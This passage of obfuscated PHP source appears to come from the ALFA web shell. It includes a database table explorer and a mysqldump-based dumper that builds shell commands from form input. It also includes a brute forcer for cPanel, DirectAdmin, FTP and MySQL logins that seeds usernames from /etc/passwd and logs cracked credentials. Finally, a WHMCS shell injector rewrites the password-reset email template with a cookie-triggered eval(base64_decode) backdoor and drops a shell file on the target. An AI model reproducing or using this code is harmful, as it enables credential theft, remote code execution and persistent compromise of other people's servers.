	$ctphgqnvb9b0a6b5d256ebaf403659bbc2111742 = mysqli_query($dhkkpmvsd77d5e503ad1439f585ac494268b351b, "SELECT table_name FROM information_schema.tables WHERE table_schema = database();");
	while($belwysnaf1965a857bc285d26fe22023aa5ab50d = mysqli_fetch_array($ctphgqnvb9b0a6b5d256ebaf403659bbc2111742, MYSQLI_ASSOC)){
		$sfmsaibm8d777f385d3dfec8815d20f7496026dc[$belwysnaf1965a857bc285d26fe22023aa5ab50d["table_name"]] = array();
		$kqohjgvmc22f50f08ce2bd49269332fe168469af = mysqli_query($dhkkpmvsd77d5e503ad1439f585ac494268b351b, "SELECT count(*) FROM `".$belwysnaf1965a857bc285d26fe22023aa5ab50d['table_name']."`");
		$mbnpbrse3c1d1548288c75001565d106dcb05dd6 = mysqli_fetch_row($kqohjgvmc22f50f08ce2bd49269332fe168469af);
		$sfmsaibm8d777f385d3dfec8815d20f7496026dc[$belwysnaf1965a857bc285d26fe22023aa5ab50d["table_name"]]["data_count"] = $mbnpbrse3c1d1548288c75001565d106dcb05dd6[0];
		$ylrerbsc7d923585d45eaf069fa072333facbbe1 = mysqli_query($dhkkpmvsd77d5e503ad1439f585ac494268b351b, "SELECT column_name FROM information_schema.columns WHERE table_name = '".$belwysnaf1965a857bc285d26fe22023aa5ab50d['table_name']."'");
		while($rfymspstcb08a1efc05437dd1a1358f362b2ecb8 = mysqli_fetch_array($ylrerbsc7d923585d45eaf069fa072333facbbe1, MYSQLI_ASSOC)){
			$sfmsaibm8d777f385d3dfec8815d20f7496026dc[$belwysnaf1965a857bc285d26fe22023aa5ab50d["table_name"]]["cols"][] = $rfymspstcb08a1efc05437dd1a1358f362b2ecb8["column_name"];
		}
	}
	mysqli_close($dhkkpmvsd77d5e503ad1439f585ac494268b351b);

	echo '<ul id="myUL">';
	foreach($sfmsaibm8d777f385d3dfec8815d20f7496026dc as $msskzybbe6d037be0f9413ca1751cce755f342ab => $pwamkeco07d43db2a74336dcfbdaeeeffe6f7a19){
	    echo '<li><span style="color:#00FF00;" class="box">'.$msskzybbe6d037be0f9413ca1751cce755f342ab.' ('.$pwamkeco07d43db2a74336dcfbdaeeeffe6f7a19["data_count"].')</span><ul class="nested">';
	    foreach($pwamkeco07d43db2a74336dcfbdaeeeffe6f7a19["cols"] as $hibqnbdud89e2ddb530bb8953b290ab0793aecb0){
	        echo '<li tbl="'.$msskzybbe6d037be0f9413ca1751cce755f342ab.'"><span style="color:#00FF00;" tbl="'.$msskzybbe6d037be0f9413ca1751cce755f342ab.'" class="box sub-box">' . $hibqnbdud89e2ddb530bb8953b290ab0793aecb0 . '</span></li>';
	    }
	    echo '</ul></li>';
	}
	echo '</ul>';
}else{
echo('<center>mysqli_connect : Error!</center>');
}
}
echo('</div>');
alfafooter();
}
function alfaDumper(){
alfahead();
echo('<div class="header">');
AlfaNum(8,9,10);
echo "<center><br><div class='txtfont_header'>| Mysql Database Dumper |</div><br><br>".getConfigHtml('all')."<form method='post' onsubmit=\"g('dumper',null,null,null,this.db_username.value,this.db_password.value,this.db_name.value,this.dfile.value,this.db_host.value); return false;\"><p>";
$qheyssydaab9e1de16f38176f86d7a92ba337a8d = array('td1' =>
 array('color' => 'FFFFFF', 'tdName' => 'db_host : ', 'inputName' => 'db_host', 'id' => 'db_host', 'inputValue' => 'localhost', 'inputSize' => '50'),
 'td2' =>
 array('color' => 'FFFFFF', 'tdName' => 'db_username : ', 'inputName' => 'db_username', 'id' => 'db_user', 'inputValue' => '', 'inputSize' => '50'),
 'td3' =>
 array('color' => 'FFFFFF', 'tdName' => 'db_password : ', 'inputName' => 'db_password', 'id' => 'db_pw', 'inputValue' => '', 'inputSize' =>'50'),
 'td4' =>
 array('color' => 'FFFFFF', 'tdName' => 'db_name : ', 'inputName' => 'db_name', 'id' => 'db_name', 'inputValue' => '', 'inputSize' => '50'),
 'td5' =>
 array('color' => 'FFFFFF', 'tdName' => 'Dump Path: ', 'inputName' => 'dfile', 'inputValue' => htmlspecialchars($GLOBALS['cwd']).'alfa.sql', 'inputSize' => '50')
);
create_table($qheyssydaab9e1de16f38176f86d7a92ba337a8d);
echo "<br><input type='submit' value=' ' name='Submit'></p></form></center>";
$rgusbycx14c4b06b824ec593239362517f538b29 = ($_POST['alfa3']);
$oimndblx5f4dcc3b5aa765d61d8327deb882cf99 = ($_POST['alfa4']);
$pghnyjea4cd4a49f25984e26fe708c1fbd896653 = ($_POST['alfa5']);
$abgylnfza1f8694b087d3fa0f4f6abbd6725aa3b = ($_POST['alfa6']);
$wlerpykf67b3dba8bc6778101892eb77249db32e = ($_POST['alfa7']);
if(!empty($pghnyjea4cd4a49f25984e26fe708c1fbd896653)){
echo __pre();
$eosqpkxk6e2baaf3b97dbeef01c0043275f9a0e7 = "<center>Check this :  <font color='red'>".$abgylnfza1f8694b087d3fa0f4f6abbd6725aa3b."</font></center>";
if(@mysqli_connect($wlerpykf67b3dba8bc6778101892eb77249db32e,$rgusbycx14c4b06b824ec593239362517f538b29,$oimndblx5f4dcc3b5aa765d61d8327deb882cf99,$pghnyjea4cd4a49f25984e26fe708c1fbd896653)){
if(strlen(alfaEx("mysqldump"))>0){
alfaEx("mysqldump --single-transaction --host=\"$wlerpykf67b3dba8bc6778101892eb77249db32e\" --user=\"$rgusbycx14c4b06b824ec593239362517f538b29\" --password=\"$oimndblx5f4dcc3b5aa765d61d8327deb882cf99\" $pghnyjea4cd4a49f25984e26fe708c1fbd896653 > '".addslashes($abgylnfza1f8694b087d3fa0f4f6abbd6725aa3b)."'");
echo($eosqpkxk6e2baaf3b97dbeef01c0043275f9a0e7);
}else{
__alert("Error...!");
}
}else{
echo('<center>mysqli_connect : Error!</center>');
}
}
echo('</div>');
alfafooter();
}
function Alfa_DirectAdmin_Cracker($xmsoipopcaf9b6b99962bf5c2264824231d7a40c){
if(!$xmsoipopcaf9b6b99962bf5c2264824231d7a40c['mysql'])
$fefubzei572d4e421e5e6b9bc11d815e8a027112 = $xmsoipopcaf9b6b99962bf5c2264824231d7a40c['protocol'].$xmsoipopcaf9b6b99962bf5c2264824231d7a40c['target'].':'.$xmsoipopcaf9b6b99962bf5c2264824231d7a40c['port'].'/CMD_LOGIN';
else $fefubzei572d4e421e5e6b9bc11d815e8a027112 = $xmsoipopcaf9b6b99962bf5c2264824231d7a40c['protocol'].$xmsoipopcaf9b6b99962bf5c2264824231d7a40c['target'].'/phpmyadmin';
$qqhrnrcwf6e57c9de709e45feb0d955351f53548 = curl_init();
curl_setopt($qqhrnrcwf6e57c9de709e45feb0d955351f53548, CURLOPT_FOLLOWLOCATION,1);
curl_setopt($qqhrnrcwf6e57c9de709e45feb0d955351f53548, CURLOPT_USERAGENT,'Mozilla/5.0 (Windows NT 6.2; WOW64; rv:17.0) Gecko/20100101 Firefox/17.0');
curl_setopt($qqhrnrcwf6e57c9de709e45feb0d955351f53548, CURLOPT_SSL_VERIFYPEER,0);
curl_setopt($qqhrnrcwf6e57c9de709e45feb0d955351f53548, CURLOPT_SSL_VERIFYHOST,0);
curl_setopt($qqhrnrcwf6e57c9de709e45feb0d955351f53548, CURLOPT_HEADER,0);
curl_setopt($qqhrnrcwf6e57c9de709e45feb0d955351f53548, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($qqhrnrcwf6e57c9de709e45feb0d955351f53548, CURLOPT_URL,$fefubzei572d4e421e5e6b9bc11d815e8a027112);
curl_setopt($qqhrnrcwf6e57c9de709e45feb0d955351f53548, CURLOPT_USERPWD, $xmsoipopcaf9b6b99962bf5c2264824231d7a40c['username'].':'.$xmsoipopcaf9b6b99962bf5c2264824231d7a40c['password']);
if($xmsoipopcaf9b6b99962bf5c2264824231d7a40c['mysql'])curl_setopt($qqhrnrcwf6e57c9de709e45feb0d955351f53548, CURLOPT_HTTPAUTH, CURLAUTH_ANY);
$nmxeqhvab4a88417b3d0170d754c647c30b7216a = @curl_exec($qqhrnrcwf6e57c9de709e45feb0d955351f53548);
$vgdiddxr698e6eabbdf9fadfceadfd2ebf5b4545 = curl_errno($qqhrnrcwf6e57c9de709e45feb0d955351f53548);
$aiahketqc719efb0fbd104327ced0c8405304153 = curl_error($qqhrnrcwf6e57c9de709e45feb0d955351f53548);
if ($vgdiddxr698e6eabbdf9fadfceadfd2ebf5b4545 > 0) {echo "<font color='red'>Error: $aiahketqc719efb0fbd104327ced0c8405304153</font><br>";}
elseif(preg_match('/CMD_FILE_MANAGER|frameset/i',$nmxeqhvab4a88417b3d0170d754c647c30b7216a)){
echo 'UserName: <font color="red">'.$xmsoipopcaf9b6b99962bf5c2264824231d7a40c['username'].'</font> PassWord: <font color="red">'.$xmsoipopcaf9b6b99962bf5c2264824231d7a40c['password'].'</font><font color="green">  Login Success....</font><br>';
$xmsoipopcaf9b6b99962bf5c2264824231d7a40c['target'] = $fefubzei572d4e421e5e6b9bc11d815e8a027112;
CrackerResualt($xmsoipopcaf9b6b99962bf5c2264824231d7a40c);
}
curl_close($qqhrnrcwf6e57c9de709e45feb0d955351f53548);
}
function Alfa_CP_Cracker($xmsoipopcaf9b6b99962bf5c2264824231d7a40c){
$fefubzei572d4e421e5e6b9bc11d815e8a027112 = $xmsoipopcaf9b6b99962bf5c2264824231d7a40c['protocol'].$xmsoipopcaf9b6b99962bf5c2264824231d7a40c['target'].':'.$xmsoipopcaf9b6b99962bf5c2264824231d7a40c['port'];
$qqhrnrcwf6e57c9de709e45feb0d955351f53548 = curl_init();
curl_setopt($qqhrnrcwf6e57c9de709e45feb0d955351f53548, CURLOPT_FOLLOWLOCATION,1);
curl_setopt($qqhrnrcwf6e57c9de709e45feb0d955351f53548, CURLOPT_USERAGENT,'Mozilla/5.0 (Windows NT 6.2; WOW64; rv:17.0) Gecko/20100101 Firefox/17.0');
curl_setopt($qqhrnrcwf6e57c9de709e45feb0d955351f53548, CURLOPT_SSL_VERIFYPEER,0);
curl_setopt($qqhrnrcwf6e57c9de709e45feb0d955351f53548, CURLOPT_SSL_VERIFYHOST,0);
curl_setopt($qqhrnrcwf6e57c9de709e45feb0d955351f53548, CURLOPT_HEADER,0);
curl_setopt($qqhrnrcwf6e57c9de709e45feb0d955351f53548, CURLOPT_RETURNTRANSFER,1);
curl_setopt($qqhrnrcwf6e57c9de709e45feb0d955351f53548, CURLOPT_HTTPHEADER, array("Authorization: Basic " . __ZW5jb2Rlcg($xmsoipopcaf9b6b99962bf5c2264824231d7a40c['username'].":".$xmsoipopcaf9b6b99962bf5c2264824231d7a40c['password']) . "\n\r"));
curl_setopt($qqhrnrcwf6e57c9de709e45feb0d955351f53548, CURLOPT_URL, $fefubzei572d4e421e5e6b9bc11d815e8a027112);
$nmxeqhvab4a88417b3d0170d754c647c30b7216a = @curl_exec($qqhrnrcwf6e57c9de709e45feb0d955351f53548);
$vgdiddxr698e6eabbdf9fadfceadfd2ebf5b4545 = curl_errno($qqhrnrcwf6e57c9de709e45feb0d955351f53548);
$aiahketqc719efb0fbd104327ced0c8405304153 = curl_error($qqhrnrcwf6e57c9de709e45feb0d955351f53548);
if ($vgdiddxr698e6eabbdf9fadfceadfd2ebf5b4545 > 0) {echo "<font color='red'>Error: $aiahketqc719efb0fbd104327ced0c8405304153</font><br>";}
elseif(preg_match('/filemanager/i',$nmxeqhvab4a88417b3d0170d754c647c30b7216a)){
echo 'UserName: <font color="red">'.$xmsoipopcaf9b6b99962bf5c2264824231d7a40c['username'].'</font> PassWord: <font color="red">'.$xmsoipopcaf9b6b99962bf5c2264824231d7a40c['password'].'</font><font color="green">  Login Success....</font><br>';
$xmsoipopcaf9b6b99962bf5c2264824231d7a40c['target'] = $fefubzei572d4e421e5e6b9bc11d815e8a027112;
CrackerResualt($xmsoipopcaf9b6b99962bf5c2264824231d7a40c);
}
curl_close($qqhrnrcwf6e57c9de709e45feb0d955351f53548);
}
function Alfa_FTP_Cracker($xmsoipopcaf9b6b99962bf5c2264824231d7a40c){
$fefubzei572d4e421e5e6b9bc11d815e8a027112 = $xmsoipopcaf9b6b99962bf5c2264824231d7a40c['protocol'].$xmsoipopcaf9b6b99962bf5c2264824231d7a40c['target'];
$qqhrnrcwf6e57c9de709e45feb0d955351f53548 = curl_init();
curl_setopt($qqhrnrcwf6e57c9de709e45feb0d955351f53548, CURLOPT_URL, $fefubzei572d4e421e5e6b9bc11d815e8a027112);
curl_setopt($qqhrnrcwf6e57c9de709e45feb0d955351f53548, CURLOPT_USERAGENT,'Mozilla/5.0 (Windows NT 6.2; WOW64; rv:17.0) Gecko/20100101 Firefox/17.0');
curl_setopt($qqhrnrcwf6e57c9de709e45feb0d955351f53548, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($qqhrnrcwf6e57c9de709e45feb0d955351f53548, CURLOPT_USERPWD, "".$xmsoipopcaf9b6b99962bf5c2264824231d7a40c['username'].":".$xmsoipopcaf9b6b99962bf5c2264824231d7a40c['password']."");
$nmxeqhvab4a88417b3d0170d754c647c30b7216a = @curl_exec($qqhrnrcwf6e57c9de709e45feb0d955351f53548);
$vgdiddxr698e6eabbdf9fadfceadfd2ebf5b4545 = curl_errno($qqhrnrcwf6e57c9de709e45feb0d955351f53548);
$aiahketqc719efb0fbd104327ced0c8405304153 = curl_error($qqhrnrcwf6e57c9de709e45feb0d955351f53548);
if ($vgdiddxr698e6eabbdf9fadfceadfd2ebf5b4545 > 0) {echo "<font color='red'>Error: $aiahketqc719efb0fbd104327ced0c8405304153</font><br>";}
elseif(preg_match('/(\d+):(\d+)/i',$nmxeqhvab4a88417b3d0170d754c647c30b7216a)){
echo 'UserName: <font color="red">'.$xmsoipopcaf9b6b99962bf5c2264824231d7a40c['username'].'</font> PassWord: <font color="red">'.$xmsoipopcaf9b6b99962bf5c2264824231d7a40c['password'].'</font><font color="green">  Login Success....</font><br>';
$xmsoipopcaf9b6b99962bf5c2264824231d7a40c['target'] = $fefubzei572d4e421e5e6b9bc11d815e8a027112;
CrackerResualt($xmsoipopcaf9b6b99962bf5c2264824231d7a40c);
}
curl_close($qqhrnrcwf6e57c9de709e45feb0d955351f53548);
}
function Alfa_Mysql_Cracker($xmsoipopcaf9b6b99962bf5c2264824231d7a40c){
if(@mysqli_connect($xmsoipopcaf9b6b99962bf5c2264824231d7a40c['target'].':'.$xmsoipopcaf9b6b99962bf5c2264824231d7a40c['port'],$xmsoipopcaf9b6b99962bf5c2264824231d7a40c['username'],$xmsoipopcaf9b6b99962bf5c2264824231d7a40c['password'])){
CrackerResualt($xmsoipopcaf9b6b99962bf5c2264824231d7a40c);
echo 'UserName: <font color="red">'.$xmsoipopcaf9b6b99962bf5c2264824231d7a40c['username'].'</font> PassWord: <font color="red">'.$xmsoipopcaf9b6b99962bf5c2264824231d7a40c['password'].'</font><font color="green">  Login Success....</font><br>';
}
}
function Alfa_FTPC($xmsoipopcaf9b6b99962bf5c2264824231d7a40c){
if($kghebeva7ed201fa20d25d22b291dc85ae9e5ced=@ftp_connect($xmsoipopcaf9b6b99962bf5c2264824231d7a40c['target'],$xmsoipopcaf9b6b99962bf5c2264824231d7a40c['port'])){
if($kghebeva7ed201fa20d25d22b291dc85ae9e5ced){
$predzshad56b699830e77ba53855679cb1d252da=@ftp_login($kghebeva7ed201fa20d25d22b291dc85ae9e5ced,$xmsoipopcaf9b6b99962bf5c2264824231d7a40c['username'],$xmsoipopcaf9b6b99962bf5c2264824231d7a40c['password']);
if($predzshad56b699830e77ba53855679cb1d252da){CrackerResualt($xmsoipopcaf9b6b99962bf5c2264824231d7a40c);}}}
@ftp_close($kghebeva7ed201fa20d25d22b291dc85ae9e5ced);
}
function CrackerResualt($xmsoipopcaf9b6b99962bf5c2264824231d7a40c){
$ybaqpbzt9b207167e5381c47682c6b4f58a623fb = $xmsoipopcaf9b6b99962bf5c2264824231d7a40c['target'].' => '.$xmsoipopcaf9b6b99962bf5c2264824231d7a40c['username'].":".$xmsoipopcaf9b6b99962bf5c2264824231d7a40c['password']."\n" ;
$yyphbkaj4a8a08f09d37b73795649038408b5f33 = @fopen($xmsoipopcaf9b6b99962bf5c2264824231d7a40c['fcrack'],'a+');
@fwrite($yyphbkaj4a8a08f09d37b73795649038408b5f33, $ybaqpbzt9b207167e5381c47682c6b4f58a623fb);
@fclose($yyphbkaj4a8a08f09d37b73795649038408b5f33);
}
function Alfa_Call_Function_Cracker($qmqhsytzea9f6aca279138c58f705c8d4cb4b8ce,$xmsoipopcaf9b6b99962bf5c2264824231d7a40c){
switch($qmqhsytzea9f6aca279138c58f705c8d4cb4b8ce){case 'cp':return Alfa_CP_Cracker($xmsoipopcaf9b6b99962bf5c2264824231d7a40c);break;case 'direct': case 'phpmyadmin':return Alfa_DirectAdmin_Cracker($xmsoipopcaf9b6b99962bf5c2264824231d7a40c);break;case 'ftp':return Alfa_FTP_Cracker($xmsoipopcaf9b6b99962bf5c2264824231d7a40c);break;case 'mysql':return Alfa_Mysql_Cracker($xmsoipopcaf9b6b99962bf5c2264824231d7a40c);break;case 'mysql':return Alfa_FTPC($xmsoipopcaf9b6b99962bf5c2264824231d7a40c);break;}
}
function alfaCrackers(){
alfahead();
AlfaNum(9,10);
echo '<div class="header"><center><br><div class="txtfont_header">| Brute Forcer |</div><br><br><form method="post" onsubmit="g(\'Crackers\',null,this.target.value,this.port.value,this.usernames.value,this.passwords.value,this.fcrack.value,\'start\',this.protocol.value,this.loginpanel.value);return false;"><div class="txtfont">Login Page: <select onclick="dis_input(this.value);" name="loginpanel">';
foreach(array('cp'=>'Cpanel','direct'=>'DirectAdmin','ftp'=>'FTP','phpmyadmin'=>'PhpMyAdmin[DirectAdmin]','mysql'=>'mysql_connect()','ftpc'=>'ftp_connect()') as $ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d=>$jjhpbbnw3a6d0284e743dc4a9b86f97d6dd1a3bf)echo('<option value="'.$ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d.'">'.$jjhpbbnw3a6d0284e743dc4a9b86f97d6dd1a3bf.'</option>');
echo '</select> Protocol: <select id="protocol" name="protocol">';
foreach(array('https://','http://','ftp://') as $jjhpbbnw3a6d0284e743dc4a9b86f97d6dd1a3bf)echo('<option value="'.$jjhpbbnw3a6d0284e743dc4a9b86f97d6dd1a3bf.'">'.$jjhpbbnw3a6d0284e743dc4a9b86f97d6dd1a3bf.'</option>');
echo '</select> Website/ip Address: <input id="target" type="text" name="target" value="localhost">
Port: <input id="port" type="text" name="port" value="2083">
<table width="30%"><td align="center">Users List</td><td align="center">Passwords</td></table>
<textarea placeholder="Users" rows="20" cols="25" name="usernames">'.($GLOBALS['sys']=='unix'?alfaEx("cut -d: -f1 /etc/passwd"):"").'</textarea>
&nbsp <textarea placeholder="Passwords" rows="20" cols="25" name="passwords"></textarea><br><br>
Save Result Into File <input type="text" name="fcrack" value="cracked.txt">
<p><input type="submit" name="cracking" value=" " /></div></form></p><center>';
$nyvfphvm42aefbae01d2dfd981f7da7d823d689e = str_replace(array('https://','http://','ftp://'),'',$_POST['alfa1']);
$fbwqabyz901555fb06e346cb065ceb9808dcfc25 = $_POST['alfa2'];
$tvrycbale7d37718e184e9b0e24dc63b4327e15e= $_POST['alfa3'];
$dyukwkie48cccca3bab2ad18832233ee8dff1b0b = $_POST['alfa4'];
$pokhxlbj454ca9a56ef4c3d664046fa330f2bdd1 = $_POST['alfa5'];
$wzwtfumy4d1f35512954cb227b25bbd92e15bc7b = $_POST['alfa6'];
$xxhhyqmq81788ba0d7d02d81c063dbca621ba11b = $_POST['alfa7'];
$ruxmuzve0056fed2e861548bc83d7220fe05cbcb = $_POST['alfa8'];
$fxuvmwpb83878c91171338902e0fe0fb97a8c47a = $ruxmuzve0056fed2e861548bc83d7220fe05cbcb == 'phpmyadmin' ? $fxuvmwpb83878c91171338902e0fe0fb97a8c47a = true : false;
if($wzwtfumy4d1f35512954cb227b25bbd92e15bc7b=='start'){
echo __pre();
$soiqswdn0b5396d6bd0867485ff63067ad9363e7 = explode("\n",$tvrycbale7d37718e184e9b0e24dc63b4327e15e);
$whuyvdnk5a009fadd3713331621174e8169e00aa = explode("\n",$dyukwkie48cccca3bab2ad18832233ee8dff1b0b);
foreach($soiqswdn0b5396d6bd0867485ff63067ad9363e7 as $eeodyzriee11cbb19052e40b07aac0ca060c23ee){
foreach($whuyvdnk5a009fadd3713331621174e8169e00aa as $zpijxrap8fe4c11451281c094a6578e6ddbf5eed){
$vmwhayoqf1f713c9e000f5d3f280adbd124df4f5 = array('username' => trim($eeodyzriee11cbb19052e40b07aac0ca060c23ee),'password' => trim($zpijxrap8fe4c11451281c094a6578e6ddbf5eed),'port' => trim($fbwqabyz901555fb06e346cb065ceb9808dcfc25),'target' => trim($nyvfphvm42aefbae01d2dfd981f7da7d823d689e),'protocol' => trim($xxhhyqmq81788ba0d7d02d81c063dbca621ba11b),'fcrack' => trim($pokhxlbj454ca9a56ef4c3d664046fa330f2bdd1),'mysql' => $fxuvmwpb83878c91171338902e0fe0fb97a8c47a);
Alfa_Call_Function_Cracker($ruxmuzve0056fed2e861548bc83d7220fe05cbcb,$vmwhayoqf1f713c9e000f5d3f280adbd124df4f5);
}
}
echo '<br><font color="red">Attack Finished...</font>';
}
echo '</div>';
alfafooter();
}
function output($syvgjxtsb45cffe084dd3d20d928bee85e7b0f21){ echo "<br><pre id=\"strOutput\" style=\"margin-top:5px\" class=\"ml1\"><br><center><font color=red><a target='_blank' href='".$syvgjxtsb45cffe084dd3d20d928bee85e7b0f21."'>Click Here !</a></font></b></center><br><br>";}
function alfaShellInjectors(){
alfahead();
echo '<div class=header>';
AlfaNum(11);
echo '<center><p><div class="txtfont_header">| Cms Shell Injector |</div></p><center><h3><a href=javascript:void(0) onclick="g(\'ShellInjectors\',null,\'whmcs\',null)">| WHMCS | </a><a href=javascript:void(0) onclick="g(\'ShellInjectors\',null,null,\'mybb\')">| MyBB | </a><a href=javascript:void(0) onclick="g(\'ShellInjectors\',null,null,null,\'vb\')">| vBulletin |</a></h3></center>';
$gheoiswh5b3c32009797feb79096d52e56a56b82 = '<p><div class="txtfont">Shell Inject Method : </div> <select name="method" style="width:100px;"><option value="auto">AutoMatic</option><option value="man">Manuel</option></select></p>';
if(isset($_POST['alfa1']) && $_POST['alfa1']== 'whmcs'){
AlfaNum();
echo __pre()."<p><div class='txtfont_header'>| WHMCS |</div></p><center><center><p>".getConfigHtml('whmcs')."</p><form onSubmit=\"g('ShellInjectors',null,'whmcs',null,null,this.method.value,null,this.dbu.value,this.dbn.value,this.dbp.value,this.dbh.value,this.path.value); return false;\" method='post'>";
$qheyssydaab9e1de16f38176f86d7a92ba337a8d = array('td1' =>
 array('color' => 'FFFFFF', 'tdName' => 'Path WHMCS Url : ', 'inputName' => 'path', 'inputValue' => 'http://site.com/whmcs', 'inputSize' => '50'),
 'td2' =>
 array('color' => 'FFFFFF', 'tdName' => 'Mysql Host : ', 'inputName' => 'dbh', 'id' => 'db_host', 'inputValue' => 'localhost', 'inputSize' => '50'),
 'td3' =>
 array('color' => 'FFFFFF', 'tdName' => 'Db Name : ', 'inputName' => 'dbn', 'id' => 'db_name', 'inputValue' => '', 'inputSize' => '50'),
 'td4' =>
 array('color' => 'FFFFFF', 'tdName' => 'Db User : ', 'inputName' => 'dbu', 'id' => 'db_user', 'inputValue' => '', 'inputSize' => '50'),
 'td5' =>
 array('color' => 'FFFFFF', 'tdName' => 'Db Pass : ', 'inputName' => 'dbp', 'id' => 'db_pw', 'inputValue' => '', 'inputSize' => '50')
);
create_table($qheyssydaab9e1de16f38176f86d7a92ba337a8d);
echo $gheoiswh5b3c32009797feb79096d52e56a56b82;
echo "<p><input type='submit' value=' '></p></form></center></td></tr></table></center>";
if(isset($_POST['alfa6'])) {
$fpgvfxxse68767ea79ef0c42d8c4653b39374eda = $_POST['alfa6'];
$kqckaclr7980a849b1d26dcf210bf4fb030c6a21 = $_POST['alfa7'];
$cxvugbgf06b18ac8deaf14a6416183145c06238c = $_POST['alfa8'];
$kwizkcfd1eb267706e34aa7423b280c24efdd775 = $_POST['alfa9'];
$jwzcflrpd6fe1d0be6347b8ef2427fa629c04485 = $_POST['alfa10'];
$qmqhsytzea9f6aca279138c58f705c8d4cb4b8ce = $_POST['alfa4'];
$hdnhijeh6a992d5529f459a44fee58c733255e86 = "{php}".ALFA_UPLOADER.";{/php}";
$dzlihuut98f29c1c71529ab0636229f44548a6dd = str_replace("'","\'",$hdnhijeh6a992d5529f459a44fee58c733255e86);
$xxxksccd0f6c36f3f097bf101cb02e03d35d4546 = "<p>Dear $dzlihuut98f29c1c71529ab0636229f44548a6dd,</p><p>Recently a request was submitted to reset your password for our client area. If you did not request this, please ignore this email. It will expire and become useless in 2 hours time.</p><p>To reset your password, please visit the url below:<br /><a href=\"{\$pw_reset_url}\">{\$pw_reset_url}</a></p><p>When you visit the link above, your password will be reset, and the new password will be emailed to you.</p><p>{\$signature}</p>{php}if(\$_COOKIE[\"sec\"] == \"123\"){eval(base64_decode(\$_COOKIE[\"sec2\"])); die(\"!\");}{\/php}";
if(!empty($kwizkcfd1eb267706e34aa7423b280c24efdd775) && !empty($fpgvfxxse68767ea79ef0c42d8c4653b39374eda) && !empty($kqckaclr7980a849b1d26dcf210bf4fb030c6a21) && !empty($hdnhijeh6a992d5529f459a44fee58c733255e86)){
if(filter_var($jwzcflrpd6fe1d0be6347b8ef2427fa629c04485,FILTER_VALIDATE_URL)){
$nyztcxgh0c1d0e2ef91d68bdb15eff954448b898 = mysqli_connect($kwizkcfd1eb267706e34aa7423b280c24efdd775,$fpgvfxxse68767ea79ef0c42d8c4653b39374eda,$cxvugbgf06b18ac8deaf14a6416183145c06238c,$kqckaclr7980a849b1d26dcf210bf4fb030c6a21) or die(mysqli_connect_error());
$opcdvzxn2f7c038d5d136408be8fe0506ecbe989= mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898,"select message from tblemailtemplates where name='Password Reset Validation'");
$jlghjstf72956065c7d6a9706978c03d86a6a579 = mysqli_fetch_assoc($opcdvzxn2f7c038d5d136408be8fe0506ecbe989);
$zomeopxz5afebf01d42bfdc7d07222bca225eadd = $jlghjstf72956065c7d6a9706978c03d86a6a579['message'];
$nwsybgtvdfe88d6af280e0ce512e3fb549b63280 = str_replace("'","\'",$zomeopxz5afebf01d42bfdc7d07222bca225eadd);
mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898,"UPDATE tblconfiguration SET value = '1' WHERE setting = 'AllowSmartyPhpTags'") or die (mysqli_error($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898));
$vagiaqvoa181b4673216ad247a0f78066a9646e1 = "UPDATE tblemailtemplates SET message='$xxxksccd0f6c36f3f097bf101cb02e03d35d4546' WHERE name='Password Reset Validation'";
$nmxeqhvab4a88417b3d0170d754c647c30b7216a = mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898,$vagiaqvoa181b4673216ad247a0f78066a9646e1) or die (mysqli_error($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898));
$tyxqkdic76ea0bebb3c22822b4f0dd9c9fd021c5 = "insert into tblclients (email) values('solevisible@fbi.gov')";
$ecwemfrq486a9bbc2c582b30c8899b6f20a7e59e = mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898,$tyxqkdic76ea0bebb3c22822b4f0dd9c9fd021c5) or die (mysqli_error($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898));
if(function_exists('curl_version') && $qmqhsytzea9f6aca279138c58f705c8d4cb4b8ce == 'auto'){
$yjikdmnn94305ab3e8d752859bc2a3ae1e55cd87 = new AlfaCURL(true);
$xlxkfxnna14152b8ce9d915a253ff5f08bb98856 = $yjikdmnn94305ab3e8d752859bc2a3ae1e55cd87->Send($jwzcflrpd6fe1d0be6347b8ef2427fa629c04485."/pwreset.php");
$snxircere71105459c77e7298b33c904bdf742be = preg_match("/name=\"token\" value=\"(.*?)\"/i",$xlxkfxnna14152b8ce9d915a253ff5f08bb98856,$cjbqugpw94a08da1fecbb6e8b46990538c7b50b2);
$yjikdmnn94305ab3e8d752859bc2a3ae1e55cd87->Send($jwzcflrpd6fe1d0be6347b8ef2427fa629c04485."/pwreset.php","post","token={$cjbqugpw94a08da1fecbb6e8b46990538c7b50b2[1]}&action=reset&email=solevisible@fbi.gov");
$xvddzlni9518b395576a418af8d4f2a87042b7d7 = "UPDATE tblemailtemplates SET message='{$nwsybgtvdfe88d6af280e0ce512e3fb549b63280}' WHERE name='Password Reset Validation'";
$qyzyxyfr54e6dce5bb57581b9fffe5c2f7d54f44 = mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898,$xvddzlni9518b395576a418af8d4f2a87042b7d7) or die (mysqli_error($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898));
__alert("shell injectet...");
$uhqxkymr633de4b0c14ca52ea2432a3c8a5c4c31= 'http://'.$jwzcflrpd6fe1d0be6347b8ef2427fa629c04485."/solevisible.php";
output($uhqxkymr633de4b0c14ca52ea2432a3c8a5c4c31);}else{
echo "<br><pre id=\"strOutput\" style=\"margin-top:5px\" class=\"ml1\"><br><center><b><font color=\"#FFFFFF\">Please go to Target => </font><a href='".$jwzcflrpd6fe1d0be6347b8ef2427fa629c04485."/pwreset.php' target='_blank'>".$jwzcflrpd6fe1d0be6347b8ef2427fa629c04485."/pwreset.php</a><br/><font color='#FFFFFF'> And Reset Password With Email</font> => <font color=red>solevisible@fbi.gov</font><br/><font color='#FFFFFF'>And Go To => </font><a href='".$jwzcflrpd6fe1d0be6347b8ef2427fa629c04485."/solevisible.php' target='_blank'>".$jwzcflrpd6fe1d0be6347b8ef2427fa629c04485."/solevisible.php</a></b></center><br><br>";}}else{__alert('Path is not Valid...');}}}
